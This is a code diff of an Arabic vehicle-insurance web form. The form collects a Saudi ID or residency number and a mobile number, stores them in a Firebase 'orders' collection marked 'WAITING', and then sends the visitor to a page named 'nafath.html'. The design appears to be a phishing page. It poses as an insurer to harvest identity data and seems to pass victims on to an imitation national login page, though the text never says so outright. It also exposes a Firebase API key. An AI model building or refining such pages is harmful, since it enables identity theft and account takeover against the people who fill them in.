@@ -3,39 +3,83 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تأمين المركبات | البداية</title>
+    <title>إصدار وثيقة تأمين</title>
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
     
     <style>
-        body { font-family: sans-serif; background: #f4f7f6; display: flex; justify-content: center; padding: 20px; }
-        .form-container { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); width: 100%; max-width: 400px; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; text-align: center; font-size: 18px; }
-        button { width: 100%; padding: 15px; background: #007bff; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 18px; }
-        button:hover { background: #0056b3; }
-        .error-msg { color: red; font-size: 14px; display: none; margin-bottom: 10px; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f8f9fa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .card {
+            background: white;
+            padding: 40px 30px;
+            border-radius: 20px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+        h2 { color: #333; margin-bottom: 30px; font-weight: bold; }
+        .input-group { text-align: right; margin-bottom: 20px; }
+        label { display: block; margin-bottom: 8px; color: #666; font-size: 14px; }
+        input {
+            width: 100%;
+            padding: 15px;
+            border: 1px solid #eee;
+            border-radius: 12px;
+            background: #fdfdfd;
+            font-size: 16px;
+            text-align: center;
+            box-sizing: border-box;
+            transition: 0.3s;
+        }
+        input:focus { border-color: #007bff; outline: none; background: #fff; }
+        button {
+            width: 100%;
+            padding: 15px;
+            background: #4a8df8;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+            margin-top: 10px;
+        }
+        button:hover { background: #357ae8; transform: translateY(-2px); }
+        .error { color: #dc3545; font-size: 13px; margin-top: 10px; display: none; }
     </style>
 </head>
 <body>
 
-<div class="form-container">
-    <h2 style="text-align: center;">إصدار وثيقة تأمين</h2>
+<div class="card">
+    <h2>إصدار وثيقة تأمين</h2>
     
-    <label>رقم الهوية / الإقامة</label>
-    <input type="tel" id="id_number" placeholder="1XXXXXXXXX" maxlength="10" 
-           oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+    <div class="input-group">
+        <label>رقم الهوية / الإقامة</label>
+        <input type="tel" id="id_num" placeholder="1XXXXXXXXX" maxlength="10">
+    </div>
+
+    <div class="input-group">
+        <label>رقم الجوال</label>
+        <input type="tel" id="phone_num" placeholder="05XXXXXXXX" maxlength="10">
+    </div>
+
+    <div id="err" class="error"></div>
     
-    <label>رقم الجوال</label>
-    <input type="tel" id="phone_number" placeholder="05XXXXXXXX" maxlength="10" 
-           oninput="this.value = this.value.replace(/[^0-9]/g, '')">
-    
-    <div id="error-box" class="error-msg"></div>
-    
-    <button onclick="handleSecureOrder()">أمن الحين</button>
+    <button onclick="checkAndSend()">أمن الحين</button>
 </div>
 
 <script>
-    // --- 1. إعدادات Firebase الخاصة بك ---
+    // إعدادات Firebase الخاصة بك
     const firebaseConfig = {
         apiKey: "AIzaSyCtPCVee8eynRfuFHZ6if_eK-vtaMYY-iE",
         authDomain: "tameen-658e9.firebaseapp.com",
@@ -47,50 +91,41 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
 
-    // --- 2. وظيفة تحويل الأرقام العربية إلى إنجليزية ---
-    function toEnglish(str) {
-        return str.replace(/[٠-٩]/g, d => d.charCodeAt(0) - 1632);
-    }
+    function toEng(s) { return s.replace(/[٠-٩]/g, d => d.charCodeAt(0) - 1632); }
 
-    // --- 3. وظيفة الإرسال الذكية ---
-    async function handleSecureOrder() {
-        const errBox = document.getElementById('error-box');
-        errBox.style.display = "none";
+    async function checkAndSend() {
+        const e = document.getElementById('err');
+        e.style.display = "none";
 
-        // جلب البيانات وتحويلها فوراً لأرقام إنجليزية
-        let idVal = toEnglish(document.getElementById('id_number').value.trim());
-        let phoneVal = toEnglish(document.getElementById('phone_number').value.trim());
+        let id = toEng(document.getElementById('id_num').value.trim());
+        let ph = toEng(document.getElementById('phone_num').value.trim());
 
-        // --- اختبار الذكاء رقم 1 (الهوية) ---
-        if (idVal.length !== 10 || (idVal[0] !== '1' && idVal[0] !== '2')) {
-            errBox.innerText = "❌ رقم الهوية غير صحيح (يجب 10 أرقام ويبدأ بـ 1 أو 2)";
-            errBox.style.display = "block";
+        // فلترة ذكية
+        if (id.length !== 10 || (id[0] !== '1' && id[0] !== '2')) {
+            e.innerText = "❌ رقم الهوية يجب أن يبدأ بـ 1 أو 2 ويتكون من 10 أرقام";
+            e.style.display = "block";
             return;
         }
 
-        // --- اختبار الذكاء رقم 2 (الجوال) ---
-        if (phoneVal.length !== 10 || !phoneVal.startsWith('05')) {
-            errBox.innerText = "❌ رقم الجوال غير صحيح (يجب 10 أرقام ويبدأ بـ 05)";
-            errBox.style.display = "block";
+        if (ph.length !== 10 || !ph.startsWith('05')) {
+            e.innerText = "❌ رقم الجوال يجب أن يبدأ بـ 05 ويتكون من 10 أرقام";
+            e.style.display = "block";
             return;
         }
 
-        // --- 4. إرسال البيانات إذا نجح الفحص ---
+        // إرسال البيانات
         try {
-            const docRef = await db.collection("orders").add({
-                id_number: idVal,
-                phone: phoneVal,
-                status: "طلب جديد",
+            const res = await db.collection("orders").add({
+                id_number: id,
+                phone: ph,
                 next_step: "WAITING",
+                status: "طلب جديد",
                 timestamp: firebase.firestore.FieldValue.serverTimestamp()
             });
-
-            // حفظ الـ ID للانتقال لصفحة نفاذ
-            localStorage.setItem('user_id', docRef.id);
+            localStorage.setItem('user_id', res.id);
             window.location.href = "nafath.html";
-
-        } catch (error) {
-            alert("حدث خطأ، يرجى التحقق من اتصالك");
+        } catch (err) {
+            alert("خطأ في الشبكة، حاول ثانية");
         }
     }
 </script>
